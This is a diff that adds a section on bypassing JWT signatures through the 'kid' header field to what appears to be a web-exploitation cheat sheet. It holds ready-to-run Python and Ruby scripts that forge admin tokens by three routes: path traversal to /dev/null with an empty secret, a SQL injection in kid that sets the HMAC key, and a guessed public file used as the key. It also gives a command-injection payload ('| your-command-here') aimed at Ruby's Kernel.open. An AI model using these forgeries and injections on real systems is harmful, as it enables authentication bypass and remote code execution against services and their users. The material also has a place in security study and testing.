@@ -311,6 +311,87 @@ Step-by-step:
       JWT.encode payload, "SECRET", "HS256"
       ```
 
+## JWT bypass kid (key id)
+[KID](https://tools.ietf.org/html/rfc7517) (key id) is used to retrieve a **key** from the **filesystem** or a **database**. If the parameter is injectable, we can manipulate the header and payload and bypass the signature. Step-by-step:
+
+- Sign with directory transversal (null secret) on python:
+
+    ```python
+    import hmac
+    import hashlib
+    import base64
+    import json
+
+    # eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
+    # base64 decoded:
+    # header = {"typ":"JWT","alg":"HS256","kid":"0001"}
+    # payload = {"user":null}
+
+    # change the header and the payload
+    header = {"typ":"JWT","alg":"HS256","kid":"../../../../../../../../../../../../../../../../dev/null"}
+    secret = ""
+    payload = {"user":"admin"}
+
+    str = base64.urlsafe_b64encode(json.dumps(header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps(payload)).rstrip("=")
+
+    sig = base64.urlsafe_b64encode(hmac.new(secret, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
+
+    print(str+"."+sig)
+    ```
+
+- Sign with SQL injection (python):
+
+    ```python
+    import hmac
+    import hashlib
+    import base64
+    import json
+
+    # eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VyIjpudWxsfQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ
+    # base64 decoded:
+    # header = {"typ":"JWT","alg":"HS256","kid":"key1"}
+    # payload = {"user":null}
+
+    # change the header and the payload
+    header = {"typ":"JWT","alg":"HS256","kid":"xyzabc' union select 'aaa"}
+    secret = "aaa"
+    payload = {"user":"admin"}
+
+    str = base64.urlsafe_b64encode(json.dumps(header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps(payload)).rstrip("=")
+
+    sig = base64.urlsafe_b64encode(hmac.new(secret, str, hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
+
+    print(str+"."+sig)
+    ```
+
+- Sign with existing file on the webserver (ruby):
+
+    ```ruby
+    require 'base64'
+    require 'openssl'
+
+    # eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
+    # base64 decoded:
+    # header = {"typ":"JWT","alg":"HS256","kid":"0001"}
+    # payload = {"user":null}
+
+    # we need to guess the bootstrap location
+    header = {"typ":"JWT","alg":"HS256","kid":"public/css/bootstrap.css"}
+    payload = {"user":"admin"}
+
+    data = Base64.strict_encode64(header)+"."+Base64.strict_encode64(payload)
+    data.gsub!("=","")
+
+    # If we use booststrap.css for example, download the file first
+    secret = File.open("bootstrap.css").read
+
+    signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, data))
+
+    puts data+"."+signature
+    ```
+
+We can run code execution here if the server using `ruby` with `Kernel.open/open` (**Ruby will run the filename as a command if the filename starts with `|`**). Look the CVE [here](https://www.ruby-lang.org/en/news/2017/12/14/net-ftp-command-injection-cve-2017-17405/). We just need to change the `kid` value to `| your-command-here` and we good to go! We don't need to change the payload or the secret because the code execution will occurs before the secret key is used. 
+
 ## Leaked .git
 We can [this](https://github.com/internetwache/GitTools) tools to extract leaked `.git/` directory
 
